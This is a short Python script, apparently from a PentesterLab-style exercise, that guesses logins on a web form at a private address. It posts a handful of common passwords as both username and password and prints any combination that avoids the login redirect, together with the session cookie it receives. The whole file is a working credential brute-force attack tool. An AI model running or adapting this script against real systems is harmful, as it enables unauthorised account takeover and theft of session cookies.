import requests

URL = "http://192.168.0.100/login"
credentials = {
        'secret',
        'pentesterlab',
        'admin',
        'test',
        'password'
}

for credential in credentials:    
    resp = requests.post(URL, "login=%(credential)s&password=%(credential)s" % {'credential': credential}, allow_redirects=False)    
    location = resp.headers.get('Location')
    
    if ("/login" not in location):
        print("Valid credentials found: %(credential)s/%(credential)s" % {'credential': credential})
        print( resp.headers.get('Set-Cookie'))
